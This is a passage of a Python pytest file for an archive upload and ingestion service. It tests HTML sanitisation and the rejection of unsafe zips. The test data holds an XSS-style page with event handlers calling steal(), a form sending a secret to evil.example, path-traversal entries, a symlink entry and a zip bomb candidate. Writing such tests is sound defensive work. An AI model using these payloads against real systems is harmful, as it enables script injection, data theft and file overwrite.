        db_session,
        {"page.html": b"<html><body><h1>Saved page</h1><p>Hello archive citation.</p></body></html>"},
    )

    jobs_response = client.get("/records/jobs")
    chunks_response = client.get("/records/chunks")

    assert jobs_response.status_code == 200
    assert chunks_response.status_code == 200
    response_text = json.dumps({"jobs": jobs_response.json(), "chunks": chunks_response.json()})
    assert str(tmp_path) not in response_text
    assert "/data/uploads" not in response_text
    assert "original.zip" not in response_text
    assert "archive_original_zip_path" not in response_text
    assert "archive_original_dir" not in response_text
    assert "archive_manifest_path" not in response_text

    archive_job = next(job for job in jobs_response.json() if job["metadata"].get("source_id") == source_id)
    archive_chunk = next(chunk for chunk in chunks_response.json() if chunk["metadata"].get("archive_source_id") == source_id)
    assert archive_job["metadata"]["archive_entry_path"] == "page.html"
    assert archive_job["metadata"]["archive_served_entry_path"] == "page.html"
    assert archive_job["metadata"]["archive_anchor_map_path"] == "anchor-map.json"
    assert archive_chunk["metadata"]["archive_entry_path"] == "page.html"
    assert archive_chunk["metadata"]["archive_served_entry_path"] == "page.html"
    assert archive_chunk["metadata"]["target_chunk_id"].startswith("archive-")


def test_archive_served_html_strips_dangerous_content_and_external_references(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    original_html = b"""
    <html>
      <body onload="steal()">
        <h1>Unsafe page</h1>
        <script>alert('x')</script>
        <form action="https://evil.example/post"><input name="secret"></form>
        <p onclick="steal()"><a href="javascript:alert(1)">Bad link</a> Safe text.</p>
        <img src="https://evil.example/pixel.png" onerror="steal()">
      </body>
    </html>
    """

    response = client.post("/uploads", files={"file": ("unsafe.zip", _zip_bytes({"page.html": original_html}), "application/zip")})

    assert response.status_code == 201
    job = db_session.get(IngestionJob, response.json()["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]
    archive_root = tmp_path / "uploads" / "source-archives" / source_id
    served_html = (archive_root / "served" / "page.html").read_text(encoding="utf-8")

    assert (archive_root / "original" / "page.html").read_bytes() == original_html
    assert "<script" not in served_html.lower()
    assert "onclick" not in served_html.lower()
    assert "onload" not in served_html.lower()
    assert "onerror" not in served_html.lower()
    assert "javascript:" not in served_html.lower()
    assert "evil.example" not in served_html
    assert "<form" not in served_html.lower()
    assert "data-source-chunk-id" in served_html


@pytest.mark.parametrize(
    ("entries", "expected_detail"),
    [
        ({"../evil.html": b"<html></html>"}, "unsafe entry path"),
        ({"/evil.html": b"<html></html>"}, "unsafe entry path"),
        ({"assets/file.exe": b"not allowed", "page.html": b"<html></html>"}, "disallowed extension"),
        ({"A/.env": b"not allowed", "page.html": b"<html></html>"}, "disallowed extension"),
        ({"__MACOSX/evil.exe": b"not allowed", "page.html": b"<html></html>"}, "disallowed extension"),
        ({"assets/style.css": b"body{}"}, "exactly one HTML"),
        ({"a.html": b"<html></html>", "b.htm": b"<html></html>"}, "multiple HTML"),
    ],
)
def test_upload_rejects_malicious_or_ambiguous_archives(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
    entries: dict[str, bytes],
    expected_detail: str,
) -> None:
    response = client.post("/uploads", files={"file": ("bad.zip", _zip_bytes(entries), "application/zip")})

    assert response.status_code == 400
    assert expected_detail in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()
    assert not (tmp_path / "evil.html").exists()


def test_upload_rejects_archive_symlink(client: TestClient, db_session: Session, tmp_path: Path) -> None:
    response = client.post("/uploads", files={"file": ("bad.zip", _zip_with_symlink(), "application/zip")})

    assert response.status_code == 400
    assert "symbolic link" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()


def test_upload_rejects_archive_with_too_many_files(client: TestClient, db_session: Session, tmp_path: Path) -> None:
    entries = {"page.html": b"<html></html>"}
    entries.update({f"assets/{index}.txt": b"x" for index in range(2000)})

    response = client.post("/uploads", files={"file": ("bad.zip", _zip_bytes(entries), "application/zip")})

    assert response.status_code == 400
    assert "too many files" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()


def test_upload_rejects_oversized_archive_zip(client: TestClient, db_session: Session, tmp_path: Path) -> None:
    def override_settings() -> Settings:
        return Settings(
            ADMIN_PASSWORD_HASH=os.environ["ADMIN_PASSWORD_HASH"],
            SESSION_SECRET=os.environ["SESSION_SECRET"],
            DATABASE_URL="sqlite+pysqlite:///:memory:",
            UPLOAD_DIR=str(tmp_path / "uploads"),
            ARCHIVE_MAX_ZIP_SIZE_BYTES=10,
        )

    app.dependency_overrides[get_settings] = override_settings

    response = client.post("/uploads", files={"file": ("bad.zip", _zip_bytes({"page.html": b"<html></html>"}), "application/zip")})

    assert response.status_code == 400
    assert "maximum allowed size" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()


def test_upload_rejects_archive_with_oversized_extracted_content(
    client: TestClient,
    db_session: Session,
    tmp_path: Path,
) -> None:
    def override_settings() -> Settings:
        return Settings(
            ADMIN_PASSWORD_HASH=os.environ["ADMIN_PASSWORD_HASH"],
            SESSION_SECRET=os.environ["SESSION_SECRET"],
            DATABASE_URL="sqlite+pysqlite:///:memory:",
            UPLOAD_DIR=str(tmp_path / "uploads"),
            ARCHIVE_MAX_EXTRACTED_SIZE_BYTES=10,
        )

    app.dependency_overrides[get_settings] = override_settings

    response = client.post("/uploads", files={"file": ("bad.zip", _zip_bytes({"page.html": b"<html></html>"}), "application/zip")})

    assert response.status_code == 400
    assert "extracted content exceeds" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()


def test_upload_rejects_zip_bomb_candidate(client: TestClient, db_session: Session, tmp_path: Path) -> None:
    response = client.post("/uploads", files={"file": ("bad.zip", _zip_bytes({"page.html": b"a" * 200_000}), "application/zip")})

    assert response.status_code == 400
    assert "unsafe compression ratio" in response.json()["detail"]
    assert db_session.scalars(select(Upload)).all() == []
    assert db_session.scalars(select(IngestionJob)).all() == []
    assert not (tmp_path / "uploads" / "source-archives").exists()


def test_upload_is_observable_through_list_and_detail_endpoints(client: TestClient) -> None:
    response = client.post("/uploads", files={"file": ("sample.md", b"# Notes", "text/markdown")})
    assert response.status_code == 201
    upload_id = response.json()["upload_id"]

    list_response = client.get("/records/uploads")
    detail_response = client.get(f"/records/uploads/{upload_id}")

    assert list_response.status_code == 200
    assert list_response.json()[0]["id"] == upload_id
    assert detail_response.status_code == 200
    assert detail_response.json()["id"] == upload_id
    assert detail_response.json()["original_filename"] == "sample.md"


def test_upload_requires_authentication() -> None:
    with TestClient(app) as unauthenticated_client:
        response = unauthenticated_client.post("/uploads", files={"file": ("sample.md", b"markdown", "text/markdown")})

    assert response.status_code == 401


def _zip_bytes(entries: dict[str, bytes]) -> bytes:
    archive = io.BytesIO()
    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zip_file:
        for name, content in entries.items():
            zip_file.writestr(name, content)
    return archive.getvalue()


@pytest.fixture()
def batch_zip_artifacts(tmp_path: Path) -> dict[str, Path]:
    artifacts = tmp_path / "batch-zips"
    artifacts.mkdir()
    files = {
        "valid-ddb-a.zip": _zip_bytes(
            {
                "Book A/page.html": b"<html><body><h1>Book A</h1><p>DDB fixture A.</p></body></html>",
                "Book A/page_files/style.css": b"body { color: #111; }",
            }
        ),
        "valid-ddb-b.zip": _zip_bytes(
            {
                "Book B/page.html": b"<html><body><h1>Book B</h1><p>DDB fixture B.</p></body></html>",
                "Book B/page_files/style.css": b"body { color: #222; }",
            }
        ),
        "invalid-zip.zip": b"not a zip archive",
        "malformed-ddb.zip": _zip_bytes(
            {
                "Malformed/page.html": b"<html><body><h1>Malformed DDB</h1><script type=\"application/json\">{</script></body></html>",
            }
        ),
    }
    for filename, content in files.items():
        (artifacts / filename).write_bytes(content)
    return {filename: artifacts / filename for filename in files}


def _upload_and_ingest_archive(client: TestClient, db_session: Session, entries: dict[str, bytes]) -> str:
    response = client.post("/uploads", files={"file": ("saved-page.zip", _zip_bytes(entries), "application/zip")})
    assert response.status_code == 201
    job = db_session.get(IngestionJob, response.json()["job_id"])
    assert job is not None
    source_id = json.loads(job.metadata_json)["source_id"]

    from app.ingestion import process_claimed_job

    processed = process_claimed_job(db_session, job.id, continue_to_index=False)
    assert processed.status == "awaiting_embedding"
    return source_id


def _create_batch_with_statuses(db: Session, tmp_path: Path, child_statuses: list[str]) -> str:
    now = utcnow()
    batch = UploadBatch(status="queued", file_count=len(child_statuses), created_at=now, updated_at=now)
    db.add(batch)
    db.flush()
    for position, child_status in enumerate(child_statuses):
        filename = f"child-{position}.zip"
        upload = Upload(
            original_filename=filename,
            stored_path=str(tmp_path / f"child-{position}.html"),
            content_type="application/zip",
            extension=".html",
            sha256=f"sha-{position}",
            size_bytes=123,
            batch_id=batch.id,
            batch_position=position,
            created_at=now,
        )
        db.add(upload)
        db.flush()
        db.add(
            IngestionJob(
                upload_id=upload.id,
                batch_id=batch.id,
                status=child_status,
                error_summary="Import failed." if child_status == "failed" else None,
                created_at=now,
                updated_at=now,
            )
        )
    db.commit()
    return batch.id


def _zip_with_symlink() -> bytes:
    archive = io.BytesIO()
    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zip_file:
        link = zipfile.ZipInfo("link.html")
        link.external_attr = (stat.S_IFLNK | 0o777) << 16
        zip_file.writestr(link, "target.html")
    return archive.getvalue()
